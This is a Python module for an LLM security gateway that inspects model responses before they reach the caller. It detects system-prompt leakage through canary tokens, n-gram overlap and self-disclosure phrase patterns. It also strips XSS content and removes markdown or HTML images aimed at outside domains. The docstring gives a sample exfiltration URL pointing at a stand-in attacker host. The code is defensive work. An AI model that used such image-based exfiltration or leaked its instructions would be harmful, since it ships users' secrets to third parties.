"""Output Guardrail Engine — OWASP LLM05 (Improper Output Handling),
LLM07 (System Prompt Leakage) and LLM02 (Sensitive Information Disclosure).

Checks applied to every model response before it reaches the caller:

* System prompt leakage
    - canary token embedded in the system prompt (exact, high-confidence)
    - n-gram shingle overlap with the system prompt (fuzzy, catches paraphrase-free dumps)
    - self-disclosure phrasing ("my system prompt is ...")
* Active content / XSS: <script>, <iframe>, inline event handlers,
  javascript:/vbscript:/data:text/html URIs
* Markdown image exfiltration: ![](https://attacker/?q=<secret>) auto-loads in
  many chat UIs and silently ships data to a third party
* Credential / PII exposure via the shared redaction engine
* Unbounded output length (LLM10)
"""

from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field

from .config import OutputGuardPolicy, SecurityPolicy
from .models import Decision, Finding, RedactionEvent, Severity, Stage, risk_score
from .redaction import PII, SECRET, Redactor

LEAK_REPLACEMENT = (
    "[Response withheld by security gateway: the model attempted to disclose confidential system configuration.]"
)

_DANGEROUS_TAGS = re.compile(
    r"<\s*(script|iframe|object|embed|applet|meta|link|base|form|svg)\b[^>]*>(?:.*?<\s*/\s*\1\s*>)?",
    re.IGNORECASE | re.DOTALL,
)
_EVENT_HANDLERS = re.compile(r"\s+on[a-z]+\s*=\s*(?:\"[^\"]*\"|'[^']*'|[^\s>]+)", re.IGNORECASE)
_DANGEROUS_URI = re.compile(r"\b(?:java\s*script|vb\s*script|livescript)\s*:|\bdata\s*:\s*text/html", re.IGNORECASE)
_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)")
_HTML_IMG = re.compile(r"<\s*img\b[^>]*\bsrc\s*=\s*[\"']?([^\"'\s>]+)[^>]*>", re.IGNORECASE)
_LEAK_PHRASES = re.compile(
    r"\b(?:my|the)\s+(?:system\s+prompt|initial\s+instructions|hidden\s+instructions|developer\s+message)"
    r"\s+(?:is|are|says|reads|states)\b|\bi\s+(?:was|am|have\s+been)\s+(?:instructed|told|programmed)\s+to\s+"
    r"never\s+reveal\b",
    re.IGNORECASE,
)
_WORD = re.compile(r"[a-z0-9]+")


def _shingles(text: str, n: int) -> set[tuple[str, ...]]:
    words = _WORD.findall(text.lower())
    return {tuple(words[i : i + n]) for i in range(max(len(words) - n + 1, 0))}


def prompt_overlap(system_prompt: str, output: str, n: int = 6) -> float:
    """Fraction of the system prompt's word n-grams that appear verbatim in ``output``."""
    ref = _shingles(system_prompt, n)
    if not ref:
        return 0.0
    return len(ref & _shingles(output, n)) / len(ref)


@dataclass
class OutputInspection:
    decision: Decision
    sanitized_text: str
    findings: list[Finding] = field(default_factory=list)
    redactions: list[RedactionEvent] = field(default_factory=list)

    @property
    def risk_score(self) -> int:
        return risk_score(self.findings)


def _f(rule_id, category, severity, message, owasp, evidence=None) -> Finding:
    return Finding(
        rule_id=rule_id,
        stage=Stage.OUTPUT,
        category=category,
        severity=severity,
        message=message,
        owasp=owasp,
        evidence=None if evidence is None else str(evidence)[:80],
    )


class OutputGuard:
    def __init__(self, policy: SecurityPolicy) -> None:
        self.policy: OutputGuardPolicy = policy.output_guard
        self.system_prompt = policy.agent.system_prompt
        self.redactor = Redactor(policy.redaction)

    def _image_allowed(self, url: str) -> bool:
        host = (urllib.parse.urlsplit(url).hostname or "").lower()
        if not host:  # relative URL, served by the host application
            return not url.lower().startswith(("data:", "javascript:"))
        return any(host == d or host.endswith("." + d) for d in self.policy.allowed_image_domains)

    # ------------------------------------------------------------------ #
    def _check_leakage(self, text: str) -> list[Finding]:
        out: list[Finding] = []
        canary = self.policy.canary_token
        if canary and canary.lower() in text.lower():
            out.append(
                _f(
                    "OG-001",
                    "system_prompt_leak",
                    Severity.CRITICAL,
                    "Canary token from the system prompt found in model output",
                    ["LLM07"],
                    canary,
                )
            )
        overlap = prompt_overlap(self.system_prompt, text, self.policy.shingle_size)
        if overlap >= self.policy.system_prompt_overlap_threshold and overlap > 0:
            out.append(
                _f(
                    "OG-002",
                    "system_prompt_leak",
                    Severity.HIGH,
                    f"Output reproduces {overlap:.0%} of the system prompt verbatim",
                    ["LLM07"],
                )
            )
        m = _LEAK_PHRASES.search(text)
        if m:
            out.append(
                _f(
                    "OG-003",
                    "system_prompt_leak",
                    Severity.MEDIUM,
                    "Model is describing its own hidden instructions",
                    ["LLM07"],
                    m.group(0),
                )
            )
        return out

    def _sanitize_active_content(self, text: str) -> tuple[str, list[Finding]]:
        findings: list[Finding] = []

        def strip_tags(m: re.Match[str]) -> str:
            findings.append(
                _f(
                    "OG-010",
                    "xss",
                    Severity.HIGH,
                    f"Active HTML element <{m.group(1).lower()}> removed",
                    ["LLM05"],
                    m.group(0),
                )
            )
            return "[removed: unsafe html]"

        text = _DANGEROUS_TAGS.sub(strip_tags, text)

        if _EVENT_HANDLERS.search(text) and re.search(r"<[a-z]", text, re.IGNORECASE):
            ev = _EVENT_HANDLERS.search(text).group(0)  # type: ignore[union-attr]
            text = re.sub(r"<[^>]*>", lambda m: _EVENT_HANDLERS.sub("", m.group(0)), text)
            findings.append(
                _f("OG-011", "xss", Severity.HIGH, "Inline JavaScript event handler removed", ["LLM05"], ev.strip())
            )

        if _DANGEROUS_URI.search(text):
            ev = _DANGEROUS_URI.search(text).group(0)  # type: ignore[union-attr]
            text = _DANGEROUS_URI.sub("blocked:", text)
            findings.append(_f("OG-012", "xss", Severity.HIGH, "Script-capable URI scheme neutralised", ["LLM05"], ev))

        def check_md_image(m: re.Match[str]) -> str:
            url = m.group(2)
            if self._image_allowed(url):
                return m.group(0)
            findings.append(
                _f(
                    "OG-013",
                    "data_exfiltration",
                    Severity.HIGH,
                    "Markdown image to non-allowlisted domain removed (exfiltration channel)",
                    ["LLM05", "LLM02"],
                    url,
                )
            )
            return f"[image removed: {m.group(1) or 'external'}]"

        def check_html_img(m: re.Match[str]) -> str:
            if self._image_allowed(m.group(1)):
                return m.group(0)
            findings.append(
                _f(
                    "OG-013",
                    "data_exfiltration",
                    Severity.HIGH,
                    "HTML image to non-allowlisted domain removed (exfiltration channel)",
                    ["LLM05", "LLM02"],
                    m.group(1),
                )
            )
            return "[image removed]"

        text = _MD_IMAGE.sub(check_md_image, text)
        text = _HTML_IMG.sub(check_html_img, text)
        return text, findings

    # ------------------------------------------------------------------ #
    def inspect(self, text: str) -> OutputInspection:
        if not self.policy.enabled:
            return OutputInspection(decision=Decision.ALLOW, sanitized_text=text)

        findings: list[Finding] = []
        sanitized = text

        leak = self._check_leakage(text)
        findings.extend(leak)
        confirmed_leak = any(f.rule_id in {"OG-001", "OG-002"} for f in leak)

        if len(sanitized) > self.policy.max_output_chars:
            findings.append(
                _f(
                    "OG-020",
                    "unbounded_consumption",
                    Severity.LOW,
                    f"Output truncated from {len(sanitized)} to {self.policy.max_output_chars} chars",
                    ["LLM10"],
                )
            )
            sanitized = sanitized[: self.policy.max_output_chars] + "\n[truncated by security gateway]"

        sanitized, xss = self._sanitize_active_content(sanitized)
        findings.extend(xss)

        kinds = set()
        if self.policy.redact_secrets:
            kinds.add(SECRET)
        if self.policy.redact_pii:
            kinds.add(PII)
        redactions: list[RedactionEvent] = []
        if kinds:
            red = self.redactor.redact(sanitized, Stage.OUTPUT, kinds=kinds, owasp=("LLM02",))
            sanitized = red.text
            findings.extend(red.findings)
            redactions = red.events

        if confirmed_leak and self.policy.leak_action == "block":
            return OutputInspection(Decision.BLOCK, LEAK_REPLACEMENT, findings, redactions)
        if confirmed_leak and self.policy.canary_token:
            sanitized = re.sub(re.escape(self.policy.canary_token), "[REDACTED:CANARY]", sanitized, flags=re.I)

        changed = sanitized != text
        decision = Decision.SANITIZED if changed else Decision.ALLOW
        return OutputInspection(decision, sanitized, findings, redactions)
